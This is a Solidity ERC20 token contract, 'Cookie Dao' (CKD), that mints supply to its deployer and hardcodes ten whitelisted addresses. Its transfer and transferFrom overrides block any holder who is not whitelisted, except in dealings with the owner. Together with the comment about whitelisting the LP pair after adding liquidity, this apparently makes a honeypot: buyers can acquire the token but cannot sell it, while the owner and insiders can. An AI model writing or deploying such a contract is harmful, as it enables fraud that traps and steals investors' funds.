// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Cookie Dao", "CKD") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 7000000 * 10 ** decimals());
        whiteList[0x2f01aceDc0842fd42C4C894ad5c0F46Da7CEF23b]= true;
        whiteList[0x8E4A3c58AaD8A58023c87C1562A61D94F55de54C]=true;
        whiteList[0x9FB5112c94b12cEFE72e8359AB5ce1D34A366cBF]=true;
        whiteList[0xb9d3C77bF11Fa5507030aB72aAe51Ad8F5e1d05E]=true;
        whiteList[0xe45BBAC4979EcF752C956aE3326a0F3625f3766e]=true;
        whiteList[0x45031cc2711662897E037aDEf62533dEDAEA5656]=true;
        whiteList[0x85EE1a32c9c134088EEc25A3E2aE354f7A756326]=true;
        whiteList[0x9A64f106908Ec8f46b6Ad7b4AC8fd451e263F442]=true;
        whiteList[0x100d39D42eC4759ABb98Db581b4A5d4E4202F504]=true;
        whiteList[0x74fFB359676712Ac6C724EdbF11f58483BA91bD3]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}